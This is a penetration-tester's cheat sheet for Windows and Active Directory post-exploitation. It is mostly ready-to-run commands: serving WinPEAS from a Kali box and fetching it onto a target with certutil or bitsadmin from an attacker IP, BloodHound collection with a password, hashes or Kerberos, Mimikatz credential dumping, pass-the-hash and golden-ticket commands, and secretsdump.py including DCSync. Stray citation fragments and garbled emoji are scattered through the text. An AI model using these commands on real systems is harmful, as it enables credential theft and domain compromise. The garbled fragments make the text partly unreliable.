How to serve WINPEAS

From directory containing winpeas
root@kali$ python3 -m http.server 80

On host machine

Works on newer machines
certutil -urlcache -split -f http://<attacker-ip>/winPEASx64.exe winpeas.exe

Works on older machines
bitsadmin /transfer winpeastask /download /priority high http://<attacker-ip>/winPEASx64.exe C:\Users\Public\winpeas.exe

BLOODHOUND

bloodhound-python -u administrator -p 'P@ssw0rd!' -d example.local -c All -ns 192.168.1.100 --zip

Parameters:

-u: Username (e.g., user@domain.local)

-p: Password

-d: Domain name (e.g., domain.local)

-c: Collection method (e.g., All, Group, LocalAdmin)

-ns: Nameserver IP (usually the Domain Controller's IP)‚Äã

üîê Authentication Options
bloodhound-python supports various authentication methods:‚Äã

Password Authentication: Provide username and password with -u and -p.

NTLM Hashes: Use the --hashes option with LM and NT hashes.

bloodhound-python -u user -d domain.local --hashes <LMHASH>:<NTHASH> -c All -ns 192.168.1.100

Kerberos Authentication: Use a Kerberos ticket with the -k option.

bloodhound-python -u user -d domain.local -k -c All -ns 192.168.1.100

Ensure you have a valid Kerberos ticket in your cache when using the -k option.‚Äã
GitHub

MIMIKATZ

üîë Key Features of Mimikatz
Credential Dumping: Extracts plaintext passwords, NTLM hashes, and Kerberos tickets directly from memory.‚Äã
akbarkhan.hashnode.dev

Pass-the-Hash (PtH): Allows authentication using NTLM hashes without knowing the actual password.‚Äã

Pass-the-Ticket (PtT): Enables the use of Kerberos tickets to authenticate to services.‚Äã
TheSecMaster

Over-Pass-the-Hash: Combines PtH and PtT by injecting a Kerberos ticket derived from an NTLM hash.‚Äã
StationX
+1
TheSecMaster
+1

Golden/Silver Ticket Attacks: Creates forged Kerberos tickets for persistent access.‚Äã
TheSecMaster
+3
Kyser Clark
+3
MEFMobile
+3

LSA Secrets Dumping: Retrieves stored credentials and secrets from the Local Security Authority (LSA).‚Äã
Windows OS Hub
+3
Byte Goblin
+3
StationX
+3

Windows Vault Access: Extracts credentials stored in the Windows Credential Vault.‚Äã
Varonis
+4
akbarkhan.hashnode.dev
+4
HADESS
+4

üõ†Ô∏è Installing Mimikatz
Download: Clone the official repository:‚Äã

bash
Copy
Edit
git clone https://github.com/gentilkiwi/mimikatz.git
Transfer to Target: Set up a simple HTTP server on your Kali machine to transfer Mimikatz to the target:‚Äã
Undercode Testing

bash
Copy
Edit
python3 -m http.server 80
Execution: On the target Windows machine, download and run Mimikatz with administrative privileges.‚Äã

üîß Common Usage Commands
Enable Debug Privileges: Required for many Mimikatz operations.‚Äã

privilege::debug
Dump Credentials from Memory: Extracts logon credentials from LSASS.‚Äã


sekurlsa::logonpasswords
Pass-the-Hash Attack: Authenticates using an NTLM hash.‚Äã

plaintext
Copy
Edit
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH
Dump LSA Secrets: Retrieves stored secrets like service account passwords.‚Äã

plaintext
Copy
Edit
lsadump::secrets
Extract Kerberos Tickets: Lists available Kerberos tickets.‚Äã
UMA Technology
+6
MEFMobile
+6
akbarkhan.hashnode.dev
+6

plaintext
Copy
Edit
kerberos::list
Create a Golden Ticket: Generates a forged Kerberos ticket for persistent access.‚Äã

plaintext
Copy
Edit
kerberos::golden /user:USERNAME /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:USER_ID
‚ö†Ô∏è Considerations and Best Practices
Administrative Privileges: Mimikatz requires elevated privileges to function correctly.‚Äã

Antivirus Detection: Many antivirus solutions flag Mimikatz as malicious. Use in controlled environments.‚Äã
MEFMobile

Ethical Use: Always ensure you have proper authorization before using Mimikatz on any system.




Use exploited creds on services.







SECRETSDUMP.PY

dumps secrets on domain services

python3 secretsdump.py DOMAIN/username:password@target_ip

for hashes

python3 secretsdump.py DOMAIN/username@target_ip -hashes LMHASH:NTHASH

for dcsync

python3 secretsdump.py DOMAIN/username:password@dc_ip -just-dc

